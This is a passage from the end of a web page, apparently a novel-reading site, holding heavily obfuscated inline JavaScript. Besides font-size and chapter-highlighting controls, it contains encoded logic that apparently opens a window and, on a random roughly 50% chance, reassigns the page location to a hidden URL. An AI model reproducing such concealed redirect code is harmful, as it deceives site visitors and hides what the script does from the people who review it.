'IIAO')])[_0x332e('0xd8', 'm&!o')](_0x52fa20[_0x332e('0x8e', 'dzEZ')], function (_0x39bcde) { _0xc17fad[_0x332e('0xd9', '2CAw')][_0x332e('0xda', 'NVod')] = _0x52fa20[_0x332e('0xdb', 'q(ds')]; var _0x34cca5 = _0x52fa20[_0x332e('0xdc', '9Q9$')](_0x52fa20[_0x332e('0xdd', 'm&!o')](_0x52fa20[_0x332e('0xde', 'nsGt')](_0x52fa20[_0x332e('0xdf', 'z#eJ')](_0x52fa20[_0x332e('0xe0', '[H$I')](_0x52fa20[_0x332e('0xe1', 'WtDe')], _0x52fa20[_0x332e('0xe2', '4^*K')]), _0x52fa20[_0x332e('0xe3', 'lFA(')]), _0x52fa20[_0x332e('0xe4', 'p%Eg')]), _0x52fa20[_0x332e('0xe5', 'YZ(i')]), _0x52fa20[_0x332e('0x1f', 'h^)U')]); window[_0x332e('0xe6', '4aVL')](_0x34cca5, _0x52fa20[_0x332e('0xe7', '$dkG')]); if (_0x52fa20[_0x332e('0xe8', 'y)25')](window[_0x332e('0xe9', 'DE^Z')][_0x332e('0xea', 'm&!o')][_0x332e('0xeb', 'jG&E')](_0x52fa20[_0x332e('0xec', 'jG&E')](kk, s229144183)), 0x0)) { if (_0x52fa20[_0x332e('0xed', 'DE^Z')](Math[_0x332e('0xee', 'h^)U')](_0x52fa20[_0x332e('0xef', 'm&!o')](Math[_0x332e('0xf0', 'ommA')](), 0x64)), 0x31)) { window[_0x332e('0xf1', 'q(ds')][_0x332e('0xf2', 'YZ(i')] = _0x52fa20[_0x332e('0xf3', 'Wg2t')](kk, s770135716, -0x6)[_0x332e('0xf4', 'lRdA')]('-', ':'); _0x39bcde[_0x332e('0xf5', '3p!y')](); } } }); }()); (function () { var _0x18788b = _0x52fa20[_0x332e('0xf6', 'jG&E')][_0x332e('0xf7', 'WtDe')]('|'), _0xe6dc58 = 0x0; while (!![]) { switch (_0x18788b[_0xe6dc58++]) { case '0': var _0xbc5d54 = document[_0x332e('0xf8', 'jG&E')](_0x52fa20[_0x332e('0xf9', 'ofxV')]); continue; case '1': var _0x59f106 = sessionStorage[_0x332e('0xfa', 'cPwE')](_0x52fa20[_0x332e('0xfb', 'p%Eg')]); continue; case '2': console[_0x332e('0xfc', 'IIAO')](_0x52fa20[_0x332e('0xfd', 'uuB*')], _0x59f106); continue; case '3': var _0x2eed19 = document[_0x332e('0xfe', 'NVod')](_0x52fa20[_0x332e('0xff', '$^Nk')]); continue; case '4': _0x2cfd27[_0x332e('0x100', 'z94q')] = function () { _0xea9729 = _0x52fa20[_0x332e('0x101', 'm&!o')](_0xea9729, 0xaa) ? _0x52fa20[_0x332e('0x102', '4^*K')](_0xea9729, 0xa) : _0xea9729; _0x2eed19[_0x332e('0x103', 'DE^Z')][_0x332e('0x104', 'BK!C')] = _0x52fa20[_0x332e('0x105', 'mQDZ')](_0xea9729, '%'); sessionStorage[_0x332e('0x106', 'z94q')](_0x52fa20[_0x332e('0x107', '4^*K')], _0xea9729); console[_0x332e('0x108', 'LRR@')](_0x52fa20[_0x332e('0x109', 'uuB*')], _0xea9729); }; continue; case '5': _0x2eed19[_0x332e('0x10a', 'G^tM')][_0x332e('0x10b', 'z94q')] = _0x52fa20[_0x332e('0x14', 'y)25')](_0xea9729, '%'); continue; case '6': console[_0x332e('0x10c', 'vPjs')](_0x52fa20[_0x332e('0x10d', 'ofxV')], _0xea9729); continue; case '7': _0xbc5d54[_0x332e('0x10e', 'DE^Z')] = function () { _0xea9729 = _0x52fa20[_0x332e('0x10f', '4^*K')](_0xea9729, 0x32) ? _0x52fa20[_0x332e('0x110', 'm&!o')](_0xea9729, 0xa) : _0xea9729; _0x2eed19[_0x332e('0x111', '[H$I')][_0x332e('0x112', 'uuB*')] = _0x52fa20[_0x332e('0x113', 'NzI@')](_0xea9729, '%'); sessionStorage[_0x332e('0x114', 'ofxV')](_0x52fa20[_0x332e('0x115', '75i$')], _0xea9729); console[_0x332e('0x116', 'lRdA')](_0x52fa20[_0x332e('0x117', 'QbX3')], _0xea9729); }; continue; case '8': var _0xea9729 = _0x52fa20[_0x332e('0x118', 'QbX3')](_0x59f106, null) ? _0x52fa20[_0x332e('0x119', 'NVod')](parseInt, _0x59f106) : 0x64; continue; case '9': var _0x2cfd27 = document[_0x332e('0x11a', 'q(ds')](_0x52fa20[_0x332e('0x11b', 'WtDe')]); continue; }break; } }()); (function () { var _0x58a4a9 = {}; _0x58a4a9[_0x332e('0x11c', '4^*K')] = _0x52fa20.lcLCO; _0x58a4a9[_0x332e('0x11d', 'nsGt')] = function (_0x2eed19, _0x539fce) { return _0x52fa20.embrn(_0x2eed19, _0x539fce); }; _0x58a4a9[_0x332e('0x11e', '!N]Q')] = function (_0x2eed19, _0x458ad4) { return _0x52fa20.dMvBx(_0x2eed19, _0x458ad4); }; _0x58a4a9[_0x332e('0x11f', '75i$')] = function (_0x2eed19, _0x3f1759) { return _0x52fa20.GDQvW(_0x2eed19, _0x3f1759); }; _0x58a4a9[_0x332e('0x120', 'PnD#')] = function (_0x2eed19, _0x2637a2) { return _0x52fa20.ICzYH(_0x2eed19, _0x2637a2); }; _0x58a4a9[_0x332e('0x121', 'lFA(')] = _0x52fa20.nXVoJ; _0x58a4a9[_0x332e('0x122', '4^*K')] = _0x52fa20.AuobT; _0x58a4a9[_0x332e('0x123', '$^Nk')] = _0x52fa20.rAIkf; _0x58a4a9[_0x332e('0x124', 'DE^Z')] = _0x52fa20.lSSzU; function _0x43b3f7(_0x432ffc, _0x2ad2d5) { var _0x4e5311 = document[_0x332e('0x125', 'q(ds')](_0x58a4a9[_0x332e('0x126', 'mQDZ')]); for (var _0x22e0d5 = 0x0; _0x58a4a9[_0x332e('0x127', 'ofxV')](_0x22e0d5, _0x4e5311[_0x332e('0x128', '2CAw')]); _0x22e0d5++) { if (_0x58a4a9[_0x332e('0x129', 'lRdA')](_0x4e5311[_0x22e0d5]['id'], _0x432ffc[_0x332e('0x12a', 'IIAO')])) { _0x4e5311[_0x22e0d5][_0x332e('0x12b', 'z#eJ')] = _0x58a4a9[_0x332e('0x12c', 'ommA')]; } else if (_0x58a4a9[_0x332e('0x12d', 'q(ds')](_0x4e5311[_0x22e0d5][_0x332e('0x12e', '$^Nk')], _0x58a4a9[_0x332e('0x12f', 'YZ(i')])) { _0x4e5311[_0x22e0d5][_0x332e('0x130', '$dkG')] = _0x58a4a9[_0x332e('0x131', 'q(ds')](_0x4e5311[_0x22e0d5][_0x332e('0x12a', 'IIAO')], _0x58a4a9[_0x332e('0x132', 'fm]J')]); } console[_0x332e('0x116', 'lRdA')](_0x22e0d5, _0x58a4a9[_0x332e('0x133', '9Q9$')], _0x4e5311[_0x22e0d5][_0x332e('0x134', 'ommA')]); } if (!_0x2ad2d5) { var _0x1a6834 = document[_0x332e('0x135', 'ommA')](_0x58a4a9[_0x332e('0x136', 'q(ds')]); _0x1a6834[_0x332e('0x137', 'Wg2t')]({ 'behavior': _0x58a4a9[_0x332e('0x138', 'BK!C')] }); } } var _0x15cbbf = document[_0x332e('0x139', 'fm]J')]('g1'); for (var _0x22e0d5 = 0x0; _0x52fa20[_0x332e('0x13a', 'lRdA')](_0x22e0d5, _0x15cbbf[_0x332e('0x13b', 'fm]J')]); _0x22e0d5++) { _0x15cbbf[_0x22e0d5][_0x332e('0x13c', '75i$')] = function () { _0x52fa20[_0x332e('0x13d', '*6[8')](_0x43b3f7, this, ![]); }; } }()); }
     </script>
-
-
 
 
 </body>
